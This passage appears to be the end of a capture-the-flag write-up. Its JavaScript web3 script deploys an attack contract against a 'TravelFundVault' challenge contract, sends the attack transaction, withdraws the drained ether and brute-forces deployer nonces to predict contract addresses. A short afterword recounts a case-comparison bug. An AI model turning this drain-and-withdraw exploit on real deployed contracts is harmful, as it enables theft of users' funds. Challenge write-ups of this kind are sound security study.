    const travelFundVaultContract = new web3.eth.Contract(travelFundVaultAbi, travelFundVaultAddr);
    const attackAddress = await createAttackContract(travelFundVaultAddr);
    console.log("Attack contract address: ", attackAddress);
    const attackContract = new web3.eth.Contract(attackContractAbi, attackAddress);

    // Build the attack transaction
    const result = await web3.eth.call({
        to: attackAddress,
        data: attackContract.methods.attack().encodeABI(),
        value: web3.utils.toWei('9', 'ether')
    });
    console.log("Attack result: ", result);
    const attackTx = {
        from: playerWallet,
        to: attackAddress,
        nonce: await web3.eth.getTransactionCount(playerWallet),
        gas: 5000000,
        gasPrice: web3.utils.toWei('50', 'gwei'),
        value: web3.utils.toWei('9', 'ether'),
        data: attackContract.methods.attack().encodeABI()
    };

    // Sign and send the transaction
    const signedAttackTx = await web3.eth.accounts.signTransaction(attackTx, privateKey);
    console.log(`Signed attack transaction: ${JSON.stringify(signedAttackTx)}`);
    const attackTxHash = await web3.eth.sendSignedTransaction(signedAttackTx.rawTransaction);
    console.log(`Transaction sent with hash: ${attackTxHash.transactionHash}`);

    // Wait for the receipt
    const attackTxReceipt = await web3.eth.getTransactionReceipt(attackTxHash.transactionHash);
    console.log(`Transaction receipt: ${attackTxReceipt}`);

    // Build the withdrawFunds transaction
    const withdrawTx = {
        from: playerWallet,
        to: attackAddress,
        nonce: await web3.eth.getTransactionCount(playerWallet),
        gas: 5000000,
        gasPrice: web3.utils.toWei('50', 'gwei'),
        data: attackContract.methods.withdrawFunds().encodeABI()
    };

    // Check the balance before withdrawing
    const balance = await attackContract.methods.getBalance().call();
    console.log(`Attack contract balance: ${balance}`);

    // Sign and send the withdrawFunds transaction
    const signedWithdrawTx = await web3.eth.accounts.signTransaction(withdrawTx, privateKey);
    const withdrawTxHash = await web3.eth.sendSignedTransaction(signedWithdrawTx.rawTransaction);
    console.log(`Transaction sent with hash: ${withdrawTxHash.transactionHash}`);

    // Wait for the receipt
    const withdrawTxReceipt = await web3.eth.getTransactionReceipt(withdrawTxHash.transactionHash);
    console.log(`Transaction receipt: ${withdrawTxReceipt}`);
    getPlayerBalance();

}

async function getContractBytecode(contractAddress) {
    try {
        // Get the bytecode from the contract address
        const bytecode = await web3.eth.getCode(contractAddress);
        console.log(`Bytecode at ${contractAddress}: ${bytecode}`);
    } catch (error) {
        console.error(`Failed to get bytecode: ${error.message}`);
    }
}
function predictAddr(nonce){
	const playerWalletBuffer = ethJsUtil.toBuffer(playerWallet);
	const nonceBuffer = ethJsUtil.toBuffer(nonce);
	const futureAddress = ethJsUtil.bufferToHex(ethJsUtil.generateAddress(
		playerWalletBuffer,
		nonceBuffer
	));
	return futureAddress
}
async function findNonce(possibleAddress){
	
	const playerWalletBuffer = ethJsUtil.toBuffer(playerWallet);
	for (var nonce = 0;nonce<Math.pow(2,8);nonce++){
		const nonceBuffer = ethJsUtil.toBuffer(nonce);
		var futureAddress = ethJsUtil.bufferToHex(ethJsUtil.generateAddress(
			playerWalletBuffer,
			nonceBuffer)
		);
		for (const [key,value] of Object.entries(possibleAddress)){
			if (value.toLowerCase() == futureAddress.toLowerCase()){
				console.log(`Location: ${key}; Address:${value}; Nonce:${nonce}`)
				return 
			}
		}
	}
}


async function main(){
	const vaultAddress = await getTravelVaultAddress()
	console.log(`Vault Address: ${vaultAddress}`)
	await exploit()
	await exploit()

}

async function createAttackContractWithNonce(nonce){
	for (var i = 0;i<=nonce;i++){
		if (await createAttackContract2(nonce)){
			return
		}
	}
}
async function investigateAddresses(){
	const treasureLocations = ["hindhede","coneyIsland","pulauSemakau"]
	const treasureAddresses = {}
	for (const location of treasureLocations){
		const address = await getLocationAddress(location)
		treasureAddresses[location] = address
	}
	await findNonce(treasureAddresses)
}
// main()
// investigateAddresses()
// createAttackContractWithNonce(34)
// unlockGate("pulauSemakau")
```

## Afterword
I forgot to .toLowerCase() the outputed hex address at first, so i spent 2 extra days on this challenge ;-; cri
I even thought the nonce was somewhere in the millions, so I tried to search through all 2^32 possible nonce values.

